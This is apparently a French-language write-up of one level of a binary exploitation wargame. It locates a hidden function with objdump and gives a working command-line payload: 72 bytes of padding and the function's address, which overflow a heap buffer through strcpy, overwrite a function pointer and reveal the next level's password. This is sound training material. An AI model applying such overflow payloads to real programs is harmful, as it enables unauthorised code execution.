En analysant le code, on constate qu'afin de pouvoir lire notre prochain mot de passe, il faut pouvoir executer la fonction n.

On va d'abbord chercher plus de details sur n:

```shell
objdump -t ./level6 | grep n
```

--> On obtient la ligne `08048454 g     F .text	00000014              n`
n est donc bien une fonction (F), nous allons donc chercher a executer son adresse: 08048454 (ou \x54\x84\x04\x08 en Little Endian)

Nous savons que la taille de dest est 64, et 8 octets supplementaires sont necessaire (metadata) avant d'acceder au prochain malloc: func_ptr.

--> Le but va etre de modifier l'adresse de func_ptr grace a strcpy.

## Nous avons :

1. L'adresse de n : \x54\x84\x04\x08
2. La taille du padding: 64 + 8 = 72

On va donc attribuer l'adresse de n a la place de l'adresse de m:

```shell
./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
```

NB: Nous ne pouvons pas mettre directement 72 "A" suivi de l'adresse car cela serait interprete comme une string, avec Python, l'hexadecimal est bien passe.

--> Nous avons notre mot de passe pour le level 7 !
